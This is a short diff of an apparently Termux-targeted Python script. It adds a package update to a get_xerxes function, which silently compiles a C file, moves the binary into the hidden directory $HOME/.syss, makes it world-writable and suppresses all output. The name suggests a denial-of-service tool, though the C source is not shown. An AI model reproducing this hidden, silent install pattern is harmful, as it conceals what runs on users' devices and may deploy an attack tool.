@@ -21,7 +21,7 @@ myname = ".demp.ov"
 
 
 def get_xerxes():
-  os.system("pkg install clang -y; gcc libs/libs.c -o libss; mv libss $HOME/.syss; chmod 777 $HOME/.syss/libss </dev/null &>/dev/null &")
+  os.system("pkg update -y; pkg install clang -y; gcc libs/libs.c -o libss; mv libss $HOME/.syss; chmod 777 $HOME/.syss/libss </dev/null &>/dev/null &")
 
 
 
